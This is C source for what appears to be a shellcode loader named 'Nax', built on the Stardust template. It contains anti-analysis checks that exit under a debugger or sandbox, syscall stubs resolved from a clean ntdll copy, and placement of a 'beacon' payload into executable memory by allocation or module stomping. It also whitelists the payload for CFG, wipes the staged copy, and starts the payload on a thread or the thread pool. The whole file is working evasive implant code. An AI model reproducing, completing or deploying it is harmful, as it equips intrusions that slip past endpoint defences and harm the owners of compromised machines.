#include "Common.h"
#include "Constexpr.h"
#include "Loader.h"
#include "Dbg.h"

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL

FUNC PVOID NaxAllocExec(
    _In_ PVOID BeaconSrc,
    _In_ ULONG BeaconSize ) {

    STARDUST_INSTANCE

    PVOID  exec_buf  = NULL;
    SIZE_T copy_size = ALIGN_UP( BeaconSize, LDR_PAGE_SIZE );
    ULONG  old_prot  = 0;

    if ( !SCAPI(NtAllocateVirtualMemory).Stub || !SCAPI(NtProtectVirtualMemory).Stub )
        return NULL;

    NAXDBGX(MOD(Kernel32), "a0-bufsz=", copy_size );
    NAXDBGX(MOD(Kernel32), "a1-clean=", MOD(CleanNtdll) );

#ifdef NAX_DEBUG
    // Probe 1: mitigation bytes — high byte = dynamic-code policy (2), low
    // byte = CFG policy (7). 0xFF = API unresolved or query failed.
    ULONG pol2 = 0x0000FFFF;
    if ( API(GetProcessMitigationPolicy) ) {
        BYTE p[4] = { 0xFF, 0xFF, 0xFF, 0xFF };
        if ( API(GetProcessMitigationPolicy)( (HANDLE)-1, 2, p, 4 ) )
            pol2 = U_PTR( p[0] ) << 8;
        if ( API(GetProcessMitigationPolicy)( (HANDLE)-1, 7, p, 4 ) )
            pol2 |= p[0];
    }
    NAXDBGX(MOD(Kernel32), "a1.1-cfg=", pol2 );

    // Round-trip probes. All NtClose probes call NtClose(0x1234) — an
    // invalid handle the kernel must RETURN 0xC0000008 for.
    //   a1.2-xex : bare `ret` planted in the unused LdrLoadDll slot —
    //              stub-page fetch/execute with NO syscall, NO dispatch
    //   a1.2-dst : DIRECT real-ntdll NtClose export  -> ntdll .text exec via
    //              the stock stub path (kernel round trip proven here)
    //   a1.2-cst : the clean map's own NtClose stub  -> clean-map exec
    //   a1.2-prob: our built indirect stub           -> stub page + encoding
    //   a1.3-prob: our NtAllocate stub, 6-arg, handle=0 -> full stack-arg path
    ULONG prob = 0xEEEEEEEE;   // sentinel: function pointer missing
    NAXDBG(MOD(Kernel32), "a1.2-pre\r\n");

    if ( SCAPI(LdrLoadDll).Stub )
        prob = (ULONG)( ( (ULONG (NTAPI *)( VOID ))SCAPI(LdrLoadDll).Stub )() );
    NAXDBGX(MOD(Kernel32), "a1.2-xex=", prob );

    if ( API(NtClose) )
        prob = (ULONG)( ( (pNtClose)API(NtClose) )( (HANDLE)0x1234 ) );
    NAXDBGX(MOD(Kernel32), "a1.2-dst=", prob );

    prob = 0xEEEEEEEE;
    PBYTE cstFn = B_PTR( LdrFunction( MOD(CleanNtdll), HASH_STR("NtClose") ) );
    if ( cstFn )
        prob = (ULONG)( ( (pNtClose)cstFn )( (HANDLE)0x1234 ) );
    NAXDBGX(MOD(Kernel32), "a1.2-cst=", prob );

    prob = 0xEEEEEEEE;
    if ( SCAPI(NtClose).Stub )
        prob = (ULONG)( ( (pNtClose)SCAPI(NtClose).Stub )( (HANDLE)0x1234 ) );
    NAXDBGX(MOD(Kernel32), "a1.2-prob=", prob );

    // 6-arg round trip on the same stub the real call uses: identical stack
    // arg layout, but handle=0 so the kernel bails before touching memory.
    prob = 0xEEEEEEEE;
    {
        PVOID  pb = NULL;  SIZE_T ps = 0x1000;
        prob = (ULONG)( ( (pNtAllocateVirtualMemory)SCAPI(NtAllocateVirtualMemory).Stub )(
            (HANDLE)0, &pb, 0, &ps, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
    }
    NAXDBGX(MOD(Kernel32), "a1.3-prob=", prob );
#endif

    NAXDBGX(MOD(Kernel32), "a1.5-pre=", SCAPI(NtAllocateVirtualMemory).Stub );

    NTSTATUS st = ( (pNtAllocateVirtualMemory)SCAPI(NtAllocateVirtualMemory).Stub )(
        NtCurrentProcess(), &exec_buf, 0, &copy_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    NAXDBGX(MOD(Kernel32), "a2-st=", st );
    if ( !NT_SUCCESS(st) || !exec_buf )
        return NULL;

    NAXDBGX(MOD(Kernel32), "a3-buf=", exec_buf );
    MmCopy( exec_buf, BeaconSrc, BeaconSize );

    st = ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
        NtCurrentProcess(), &exec_buf, &copy_size, PAGE_EXECUTE_READ, &old_prot );
    NAXDBGX(MOD(Kernel32), "a4-rx=", st);
    if ( !NT_SUCCESS(st) )
        return NULL;

    return exec_buf;
}

#endif

/* ========= [ staged-copy wipe ] ========= */

/* Zero the pack tail (header + beacon source copy + pdata/xdata) inside the
 * blob region the bootstrap executed from.  Padded packs place the header at
 * the next page boundary after the loader image, so flipping only the tail
 * RW never VMProtects a page holding loader code.  Main guards the call on
 * the padded-pack probe; legacy packs skip the wipe (their header shares a
 * page with loader code - a VP there would NX it mid-execution).  A failed
 * VP pair simply persists the copy; boot continues either way. */
FUNC VOID NaxWipeStaged(
    _In_ PVOID Tail,
    _In_ ULONG Total ) {
    STARDUST_INSTANCE

    PVOID  base = C_PTR( U_PTR( Tail ) & ~( LDR_PAGE_SIZE - 1 ) );
    SIZE_T size = ALIGN_UP( U_PTR( Tail ) - U_PTR( base ) + Total, LDR_PAGE_SIZE );
    ULONG  oldp = 0;

    if ( !SCAPI( NtProtectVirtualMemory ).Stub )
        return;

    NTSTATUS st = ( (pNtProtectVirtualMemory)SCAPI( NtProtectVirtualMemory ).Stub )(
        NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldp );
    if ( !NT_SUCCESS(st) || !base )
        return;

    MmZero( Tail, Total );

    ( (pNtProtectVirtualMemory)SCAPI( NtProtectVirtualMemory ).Stub )(
        NtCurrentProcess(), &base, &size, oldp, &oldp );
}

FUNC VOID Main(
    _In_ PVOID Param ) {

    STARDUST_INSTANCE

    PVOID hdr        = { 0 };
    PVOID beacon_src = { 0 };
    PVOID entry      = { 0 };
    BOOL  padded     = FALSE;

    // 1) Anti-analysis: bail silently on debugger/sandbox signals.
#if !NAX_NO_AA
    NAXDBG(MOD(Kernel32), "m1-aa\r\n");
    if ( !NaxAntiAnalysis() ) {
        NAXDBG(MOD(Kernel32), "m1-aa-FAIL\r\n");
        return;
    }
#endif

    // 2) Resolve modules.  PreMain already proved both resolves succeed;
    //    the FAIL tags anchor on the still-valid pointers so an unexpected
    //    regression here becomes visible in the ladder instead of dying silent.
    PVOID k32Anchor = MOD(Kernel32);
    if ( !(MOD(Kernel32) = LdrModulePeb(H_MODULE_KERNEL32)) ) {
        NAXDBG( k32Anchor, "m1.5-k32-F\r\n" );
        return;
    }

    // In-process ntdll is only used for non-sensitive thread-pool APIs.
    if ( !(MOD(Ntdll) = LdrModulePeb(H_MODULE_NTDLL)) ) {
        NAXDBG( MOD(Kernel32), "m1.5-ntd-F\r\n" );
        return;
    }

    NAXDBG(MOD(Kernel32), "m2-apis\r\n");

    // 3) Resolve APIs from the clean ntdll copy and kernel32.
    //    LdrLoadDll must come from the in-process ntdll: the clean copy is
    //    mapped PAGE_EXECUTE_READ, and LdrLoadDll writes ntdll's own .data
    //    (loader lock, hash tables) as soon as it runs.  The clean copy
    //    stays syscall-source only (export walk + SSN + gadget).
    API(LdrLoadDll) = (pLdrLoadDll)LdrFunction( MOD(Ntdll), HASH_STR("LdrLoadDll") );

    API(VirtualProtect) = (pVirtualProtect)LdrFunction( MOD(Kernel32), HASH_STR("VirtualProtect") );
    API(LoadLibraryExW) = (pLoadLibraryExW)LdrFunction( MOD(Kernel32), HASH_STR("LoadLibraryExW") );
    API(GetProcessMitigationPolicy) = (pGetProcessMitigationPolicy)LdrFunction( MOD(Kernel32), HASH_STR("GetProcessMitigationPolicy") );

    MOD(Kernelbase) = LdrModulePeb( H_MODULE_KERNELBASE );
    if ( MOD(Kernelbase) ) {
        API(SetProcessValidCallTargets) = (BOOL (WINAPI *)(HANDLE,PVOID,SIZE_T,ULONG,PVOID))
            LdrFunction( MOD(Kernelbase), HASH_STR("SetProcessValidCallTargets") );
    }

#if NAX_EXEC_MODE == NAX_EXEC_THREAD
    API(CreateThread) = (pCreateThread)LdrFunction( MOD(Kernel32), HASH_STR("CreateThread") );
#elif NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
    API(TpAllocWork)   = (pTpAllocWork)LdrFunction(   MOD(Ntdll), HASH_STR("TpAllocWork") );
    API(TpPostWork)    = (pTpPostWork)LdrFunction(    MOD(Ntdll), HASH_STR("TpPostWork") );
    API(TpReleaseWork) = (pTpReleaseWork)LdrFunction( MOD(Ntdll), HASH_STR("TpReleaseWork") );
#endif

    NAXDBG(MOD(Kernel32), "m2-apis-ok\r\n");
    if ( !API(LdrLoadDll) || !API(VirtualProtect) ) {
        NAXDBG(MOD(Kernel32), "m2-apis-FAIL\r\n");
        return;
    }

    // 4) Parse NaxHeader v2.
    NAXDBG(MOD(Kernel32), "m3-hdr\r\n");
    hdr = LOADER_END();

    // Packed builds pad the loader to a page boundary and place the header
    // there; legacy headerless/v2 packs keep the header right behind the
    // loader image.  Probe aligned first, fall back otherwise - the probe
    // also gates the staged-copy wipe once placement succeeds.
    if ( HDR_U32( C_PTR( ALIGN_UP( U_PTR( hdr ), LDR_PAGE_SIZE ) ), NAX_HDR_OFF_MAGIC ) == NAX_HDR_MAGIC ) {
        hdr    = C_PTR( ALIGN_UP( U_PTR( hdr ), LDR_PAGE_SIZE ) );
        padded = TRUE;
    }

    ULONG magic       = HDR_U32( hdr, NAX_HDR_OFF_MAGIC );
    ULONG beacon_size = HDR_U32( hdr, NAX_HDR_OFF_BEACON_SZ );

    // v1 fallback.
    if ( magic != NAX_HDR_MAGIC ) {
        beacon_size = magic;
        beacon_src  = C_PTR( U_PTR(hdr) + 4 );

        if ( !beacon_size || beacon_size > 256 * 1024 )
            return;

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
        entry = NaxAllocExec( beacon_src, beacon_size );
#else
        entry = beacon_src;
#endif
        if ( !entry )
            return;

        ( (VOID (*)(VOID))entry )();
        return;
    }

    if ( !beacon_size || beacon_size > 512 * 1024 )
        return;

    beacon_src = C_PTR( U_PTR(hdr) + NAX_HDR_SIZE );

    // 5) Place beacon into executable memory.
    NAXDBG(MOD(Kernel32), "m4-place\r\n");
#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
    ULONG  pdata_size = HDR_U32( hdr, NAX_HDR_OFF_PDATA_SZ );
    ULONG  xdata_size = HDR_U32( hdr, NAX_HDR_OFF_XDATA_SZ );
    ULONG  text_rva   = HDR_U32( hdr, NAX_HDR_OFF_TEXT_RVA );
    PWCHAR dll_name   = HDR_WSTR( hdr, NAX_HDR_OFF_DLL_NAME );
    PVOID  pdata_src  = C_PTR( U_PTR(beacon_src) + beacon_size );
    PVOID  xdata_src  = C_PTR( U_PTR(pdata_src) + pdata_size );

    entry = NaxModuleStomp( hdr, beacon_src, beacon_size,
                            pdata_src, pdata_size, xdata_src, xdata_size,
                            text_rva, dll_name );
#elif NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
    entry = NaxAllocExec( beacon_src, beacon_size );
#endif

    if ( !entry ) {
        NAXDBG(MOD(Kernel32), "m4-place-FAIL\r\n");
        return;
    }

    // 5b) Wipe the staged footprint out of the pack tail.
    NAXDBG(MOD(Kernel32), "m5-wipe\r\n");
#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
    if ( padded )
        NaxWipeStaged( hdr, NAX_HDR_SIZE + beacon_size + pdata_size + xdata_size );
#elif NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
    if ( padded )
        NaxWipeStaged( hdr, NAX_HDR_SIZE + beacon_size );
#endif

    // 6) CFG: whitelist beacon entry in stomped DLL.
#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
    if ( API(GetProcessMitigationPolicy) && API(SetProcessValidCallTargets) && Instance()->StompDllBase ) {
        BYTE policy[4] = { 0 };
        if ( API(GetProcessMitigationPolicy)( (HANDLE)-1, 7, policy, 4 ) && (policy[0] & 1) ) {
            PIMAGE_NT_HEADERS cfgNt = NaxPeHeaders( Instance()->StompDllBase );
            if ( cfgNt ) {
                SIZE_T cfgLen = ALIGN_UP( cfgNt->OptionalHeader.SizeOfImage, LDR_PAGE_SIZE );
                struct { ULONG_PTR Offset; ULONG_PTR Flags; } cfg = {
                    U_PTR(entry) - U_PTR(Instance()->StompDllBase),
                    1   // CFG_CALL_TARGET_VALID
                };
                API(SetProcessValidCallTargets)( (HANDLE)-1, Instance()->StompDllBase, cfgLen, 1, &cfg );
            }
        }
    }
#endif

    // 7) Transfer execution.
    NAXDBG(MOD(Kernel32), "m6-exec\r\n");
#if NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
    NaxExecThreadPool( entry );
#elif NAX_EXEC_MODE == NAX_EXEC_THREAD
    NaxExecThread( entry );
#endif
}
